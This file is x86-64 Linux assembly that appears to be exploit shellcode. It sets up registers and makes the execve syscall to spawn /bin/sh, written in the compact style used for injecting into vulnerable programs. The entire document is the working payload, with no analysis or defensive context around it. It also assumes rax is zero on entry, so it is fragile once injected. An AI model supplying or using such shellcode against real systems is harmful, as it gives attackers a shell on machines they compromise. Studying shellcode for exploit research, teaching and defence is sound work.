;execve("/bin//sh", 0, 0) for linux/x86-64
section .text
global _start
_start:
push rax ; rax on stack
xor rdx, rdx ; rdx= NULL
xor rsi, rsi ; rsi=NULL
mov rbx,'/bin//sh' ;rbx="bin//sh"
push rbx ; first on stack
push rsp ; second on stack
pop rdi ; rdi="/bin//sh",0
mov al, 59
syscall
